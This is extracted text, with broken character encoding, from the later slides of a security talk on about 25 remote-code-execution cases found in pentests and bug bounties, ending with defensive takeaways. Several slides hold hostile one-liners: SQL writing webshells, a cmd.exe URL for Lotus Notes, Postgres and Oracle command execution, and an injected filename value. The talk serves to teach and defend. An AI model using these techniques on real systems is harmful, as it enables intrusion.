â—‹
Exposed gitlab instance, not up-to-date
â—‹
Post image, analized by exiftools
â—‹
Support of weird & unsecure formats â¤
â—
Sources
â—‹
https://gitlab.com/gitlab-org/gitlab/-/issues/327121 
â—‹
https://github.com/mr-r3bot/Gitlab-CVE-2021-22205 
â—
Fun Fact
â—‹
First seen as post-auth with a friend
â—‹
â€œWhy canâ€™t I ï¬nd login logs???â€
â—‹
2 days later, update for a pre-auth RCE on gitlab...
32
Laravel, SQLi, SELECT INTO OUTFILE
â—
Why & How
â—‹
Laravel on windows
â—‹
Custom code offers SQLi
â—‹
 --secure-ï¬le-priv=""
â—‹
SELECT * FROM osef INTO OUTFILE /var/www/html/webshell.php
â—
Sources
â—‹
https://sebhastian.com/mysql-ï¬x-secure-ï¬le-priv-error/ 
â—
 Fun fact
â—‹
â€œProdâ€ was a dev laptop kept open
33
Java stacktrace to RCE
â—
Why & How
â—‹
Fuzz path, ï¬nd Java StackTrace
â—‹
Extract package name
â—‹
Google â€œ$PACKAGE_NAMEâ€
â—‹
Sources pushed on maven (nexus)
â—‹
Hardcoded tomcat creds
â—‹
Login && Deploy .war
â—
Sources
â—‹
https://fr.sonatype.com/products/nexus-repository
â—‹
https://beanstack.io/ 
34
Viewstate encrypted with default key
â—
Why & How
â—‹
Crawl, grep, ï¬nd __VIEWSTATE
â—‹
Bruteforce weak secret with Blacklist3r
â—‹
ForEach gadget with ysoserial.net
â—‹
Reverse shell with pyfuscation
â—
Sources
â—‹
https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter
â—‹
https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper
â—‹
https://github.com/pwntester/ysoserial.net 
â—‹
https://github.com/CBHue/PyFuscation 
35
SSTI Dotnet, razor template
â—
Why & How
â—‹
Crawl... Aggressively!
â—‹
query=%22foo%22 -> 200
â—‹
query=â€ -> 400
â—‹
query=â€%2Bâ€fooâ€%2Bâ€ -> 200
â—‹
B-Y-O-Payload
â—
Sources
â—‹
https://docs.microsoft.com/fr-fr/aspnet/core/mvc/views/razor 
â—‹
https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/ 
"
36
Lotus notes hashs & QuickConsole
â—
Why & How
â—‹
Lotus notes, like, really old
â—‹
CVE-2005-2428 -> leak all user hashs
â—‹
hashcat + rockyou2021.txt
â—‹
Login as Admin + QuickConsole
â—‹
/webadmin.nsf/agReadConsoleData$UserL2?
OpenAgent&Mode=QuickConsole&Command=cmd.exe+/c+$CMD
â—
Sources
â—‹
https://www.exploit-db.com/exploits/39495 CVE-2005-2428
â—‹
https://github.com/coldfusion39/domi-owned 
37
Spip 0-day, write cache-ï¬le into include
â—
Why & How
â—‹
Setup Spip
â—‹
Fuzz spip (sulfateuse â¤â¤â¤)
â—‹
cd logs && grep -riF sulf
â—‹
Output reï¬‚ected in 1337_cache.php
â—‹
Add some quotes in there, insert code
â—‹
Payload reï¬‚ected in included cache ï¬le
â—‹
Query for shell?
â—
Sources
â—‹
https://discuter.spip.net/t/mise-a-jour-critique-de-securite-spip-3-2-8-et-spip-3-1-13/150707 
38
Spip 0-day, Weak creds, custom â€œSSTIâ€
â—
Why & How
â—‹
Find Spip
â—‹
Login to Spip - admin:admin
â—‹
Set article title to 
â—‹
Bump article state
â—‹
Email(eval(Article X submitted))
â—‹
Enjoy shell
â—
Sources
â—‹
Â¯\_(ãƒ„)_/Â¯Â¯\_(ãƒ„)_/Â¯Â¯\_(ãƒ„)_/Â¯
â—‹
TBD - php-Internalog
â—‹
https://github.com/laluka/pty4all 
39
Magento2 SSTI, n-day
â—
Why & How
â—‹
Magento2 - Pre-auth SSTI
â—‹
CVE-2022-24086 & CVE-2022-24087
â—‹
ğŸ¤ğŸ¤ğŸ¤ğŸ¤ğŸ¤ğŸ¤ğŸ¤ğŸ¤ğŸ¤ğŸ¤ğŸ¤ğŸ¤ğŸ¤
â—‹
Used 3 times
â—
Sources
â—‹
https://sansec.io/research/magento-2-cve-2022-24086 
40
Liferay unserialize
â—
Why & How
â—‹
Liferay old-ish
â—‹
Unserialize known issues
â—‹
2 rce, different gadgets
â—
Sources
â—‹
https://medium.com/@knownsec404team/
Liferay-portal-json-web-service-deserialization-vulnerability
-cve-2020-7961-analysis-ca9f24478274
â—‹
https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html
â—‹
https://www.synacktiv.com/publications
/how-to-exploit-liferay-cve-2020-7961-quick-journey-to-poc.html 
41
ALM misconï¬guration & Mbeans
â—
Why & How
â—‹
ALM/Quality Center misconï¬g
â—‹
Exposed /qcbin/debug, enable jmx-console
â—‹
/qcbin/jmx-console is now exposed
â—‹
Heapdump heapdump-shell.jsp in webroot
â—
Sources
â—‹
https://github.com/laluka/jolokia-exploitation-toolkit
/blob/main/exploits/ï¬le-write-to-rce-vhost-jfr.md
â—‹
https://eyeontesting.com/answers/how-do-i-get-to-the-almquality
-center-debug-page-where-it-tells-me-about-java-heap-use/ 
42
Adminer, rogue sql server, DUMPFILE
â—
Why & How
â—‹
/adm redirects to adminer.php
â—‹
Default creds - adminer:adminer
â—‹
Connect to sql 127.0.0.1:3306
â—‹
SELECT INTO DUMPFILE â€œshell.phpâ€
â—
Sources
â—‹
https://github.com/p0dalirius/CVE-2021-43008-AdminerRead 
43
Weird upload & LFI
â—
Why & How
â—‹
File upload on app, not stored in webroot :(
â—‹
Empty ï¬lename outputs /tmp/smth/RANDOMMM.png
â—‹
App contains LFI, classic ?style=foo.css
â—‹
LFI(/tmp/smth/RANDOMMM.png) = webshell
â—
Sources
â—‹
https://github.com/roughiz/lï¬to_rce 
â—‹
https://insomniasec.com/
cdn-assets/LFI_With_PHPInfo_Assistance.pdf 
44
Actuator env & Postgresql
â—
Why & How
â—‹
Exposed /actuator/env
â—‹
env contains postgres credentials
â—‹
Connect to postgres
â—‹
COPY * FROM PROGRAM â€œidâ€;
â—
Sources
â—‹
https://github.com/rapid7/metasploit-framework
/blob/master/modules/exploits/multi/postgres/
postgres_copy_from_program_cmd_exec.rb 
45
SAP - Virtualjdbc
â—
Why & How
â—‹
/virtualjdbc/ is 403, forbidden
â—‹
//virtualjdbc/ - direct unserialize rce
â—‹
/v%69rtualjdbc/ - direct unserialize rce
â—
Sources
â—‹
https://wiki.scn.sap.com/wiki/pages
/viewpage.action?pageId=523998017 
â—‹
http://vjdbc.sourceforge.net/ 
â—‹
https://pyn3rd.github.io/2022/06/02/Make-JDBC-Attacks-Brilliant-Again/ 
payload
46
Tomcat CVE, Trailing Slash
â—
Why & How
â—‹
/%ff gives an error 500 with stacktrace
â—‹
Tomcat version vulnerable to known CVE
â—‹
readonly initialization parameter set to false
â—‹
Try that good oldâ€™ PUT webshell.jsp/
â—‹
It Works... O_o
â—
Sources
â—‹
https://www.infosecmatter.com/metasploit-module-library
/?mm=exploit/multi/http/tomcat_jsp_upload_bypass
â—‹
https://developpaper.com/question/modify-the-initialization-
parameter-of-tomcat-embedded-in-springboot-readonly/ 
47
File upload, webshell in jsp|php|asp
â—
Why & How
â—‹
Weak creds OR pre-auth ï¬le upload
â—‹
Upload a dead-simple webshell : jsp|php|asp
â—‹
2 times with â€œJquery ï¬le uploadâ€ in subdirs
â—‹
2 times with various custom code
â—‹
1 time with war upload to tomcat auto-deploy path
â—
Sources
â—‹
https://github.com/xl7dev/WebShell
â—‹
https://www.webucator.com/article/
how-to-use-the-autodeploy-attribute-in-apache-tomc/
Before           ->           ğ–†ğ–Šğ–™ğ–Šğ–—
48
Oracle 11g, SQLi & Custom â€œfeaturesâ€
â—
Why & How
â—‹
SQLI on login feature, password ï¬eld... AGAIN...
â—‹
DBMS Oracle 11g on windows
â—‹
SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper
cmd.exe /c ping $DOMAIN') FROM DUAL; 
â—
Sources
â—‹
http://www.davidlitchï¬eld.com/HackingAurora.pdf 
â—‹
https://owasp.org/www-pdf-archive/ASDC12-
New_and_Improved_Hacking_Oracle_From_Web.pdf 
49
Oracle, XXE, Path traversal & feature abuse
â—
Why & How
â—‹
Click Click, browse the website, ï¬nd a SOAP xml endpoint
â—‹
Pre-auth XXE in SOAP endpoint
â—‹
Turn XXE into OOB SSRF read
â—‹
Find open port http port 7401
â—‹
Enumerate, ï¬nd a Weblogic console
â—‹
Use bypass-url-parser to reach console.portal
â—
Sources
â—‹
SOAP XXE https://gist.github.com/staaldraad/01415b990939494879b4 
â—‹
https://github.com/laluka/bypass-url-parser 
â—
Fun fact
â—‹
URL bypass found was already known, CVE-2020-14882 ğŸ‰ğŸ‰ğŸ‰
50
Weblogic, xmlpserver/ReportTemplateService
â—
Why & How
â—‹
Weblogic, fuzz, ï¬nd /xmlpserver/ReportTemplateService
â—‹
Known pre-auth XXE with CVE-2019-2616
â—‹
File Read on admin hashs
â—‹
Crack weak hashs & login
â—‹
RCE in JDBC URI handler
â—
Sources
â—‹
https://github.com/vah13/OracleCVE/blob/master/
Oracle%20Business%20Intelligence/XXE/CVE-2019-2616_PoC.txt 
â—‹
https://pyn3rd.github.io/2022/06/02/Make-JDBC-Attacks-Brilliant-Again/ 
51
Exposed git, ï¬le write on authorized_keys2
â—
Why & How
â—‹
Fuzz, /.git/HEAD goes 403
â—‹
/;//.git/HEAD goes 200, DUMP IT!!
â—‹
Django admin creds in readme.md
â—‹
Login as admin, â€œwrite logs to Xâ€ feature
â—‹
[junk]\n[ssh-rsa ...]\n[junk] in authorized_keys2
â—‹
Ssh on â€œyourâ€ server ğŸ™ƒ
â—
Sources
â—‹
https://github.com/django/django
â—‹
http://man.he.net/man5/authorized_keys 
52
Symfony Fragment
â—
Why & How
â—‹
Fuzz, /_fragment found with various error codes
â—‹
Default APP_SECRET used (good wordlist in the exploit)
â—‹
OR read APP_SECRET in /_proï¬ler/phpinfo (debug)
â—‹
Send a signed and serialized Monolog object in path
â—‹
Now, repeat 4 times...
â—
Sources
â—‹
https://www.ambionics.io/blog/symfony-secret-fragment
â—‹
https://github.com/ambionics/symfony-exploits
â—‹
https://twitter.com/cfreal_ 
53
Outdated vbulletin, code injection
â—
Why & How
â—‹
Crawl, grep for version numbers, ï¬nd an old vbulletin
â—‹
Google â€œexploit vbulletin 5.5.3â€ -> CVE-2019-16759
â—‹
Textbook php code injection...
â—
Sources
â—‹
https://www.cvedetails.com/cve/CVE-2019-16759/
â—‹
https://github.com/jas502n/CVE-2019-16759
54
Command injection in pdf rendering ï¬lename
â—
Why & How
â—‹
Custom java code
â—‹
Renders html to pdf with Wkhtmltopdf!!!
â—‹
No xss, no redirect, no javascript ğŸ˜­ğŸ˜­ğŸ˜­
â—‹
Actually, nickname gives nickname.pdf
â—‹
Register with nick;ping$IFS$DOMAIN;name
â—‹
Command execution in ï¬lename BEFORE rendering...
â—
Sources
â—‹
https://wkhtmltopdf.org/
â—‹
https://lmgtfy.app/?q=should+i+sanitize+user+inputs
â—‹
https://lmgtfy.app/?q=is+it+bad+to+concatenate+strings 
55
Log4shell binance.cn  & SOC
â—
Why & How
â—‹
Wake up one day, Log4Shell is now a thing
â—‹
Spray payloads with various custom nuclei templates
â—‹
Pwn a SOC 1 week later
â—‹
Pwn binance.cn in BugBounty
â– 
Duplicate, 10mn late
â– 
Do not receive 10k$
â– 
Sad Soup
â—
Sources
â—‹
https://github.com/kozmer/log4j-shell-poc
â—‹
https://www.lunasec.io/docs/blog/log4j-zero-day/
â—‹
https://bishopfox.com/blog/identify-and-exploit-log4shell 
â—
Fun fact
â—‹
Some sings are SUPER WEIRD to trigger
â—‹
Some callbacks spawn 1 WEEK LATER
56
[CENSORED] - CVE-XXXX-XXXXX :)
â—
Why & How
â—‹
Pre-auth ï¬le write through â€œweird SSRFâ€
â—‹
Autoload included before a call to is_dir
â—‹
Guzzle with phar://
â—
Sources
â—‹
https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserializat
ion-Vulnerability-Jim-But-Not-As-We-Know-It.pdf
â—‹
https://vickieli.dev/insecure%20deserialization/unserialize/ 
57
3. Takeaways
58
Letâ€™s apply Paretoâ€™s rule:
20% effort == 80% efficiency
1.
Do not mix routing & ï¬lesystem
2.
Avoid to the maximum PHP & JAVA
3.
Keep your software up-to-date
4.
Be super careful with
a.
Serialization (Unserialize for the win <3)
b.
PDF rendering (browser exploit, ï¬le read, XSS, SSRF)
c.
File-Write & Upload features (WebShell, ssh keys)
d.
String Concatenations (SSRF/CMD/SQLi)
e.
Stacktraces (Not a joke, itâ€™s often the ï¬rst sin)
59
Then, what would be a safe prod?
1.
Golang or Rust backend (API only), compiled into a single stripped binary
2.
A react frontend that mitigates most of the XSS
3.
An ORM used in the backend for every database request
4.
Increase segmentation, one service by minimalistic container
5.
A strong Web Application Firewall (Cloudï¬‚are, Sqreen, Imperva)
6.
A strong Software Update Policy (bump everything twice a month)
7.
Frequent security audits, and security trainings for the developers
60
@TheLaluka
thinkloveshare.com
1001 ways to PWN prod
A tale of 60 RCE in 60 minutes
61